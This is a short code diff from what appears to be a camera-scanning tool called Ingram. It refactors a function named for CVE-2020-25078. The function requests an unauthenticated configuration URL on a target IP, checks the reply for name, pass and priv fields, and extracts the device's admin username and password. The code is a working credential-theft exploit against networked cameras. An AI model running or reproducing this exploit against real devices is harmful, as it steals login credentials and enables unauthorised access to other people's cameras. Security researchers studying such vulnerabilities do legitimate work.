@@ -6,12 +6,11 @@ from Ingram.utils import logger
 
 
 def cve_2020_25078(ip: str) -> list:
-    headers = {'User-Agent': config['USERAGENT']}
+    headers = {'User-Agent': config.USERAGENT}
     url = f"http://{ip}/config/getuser?index=0"
-    timeout = config['TIMEOUT']
 
     try:
-        r = requests.get(url, timeout=timeout, verify=False, headers=headers)
+        r = requests.get(url, timeout=config.TIMEOUT, verify=False, headers=headers)
         if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
             items = r.text.split()
             user, passwd = items[0].split('=')[1], items[1].split('=')[1]
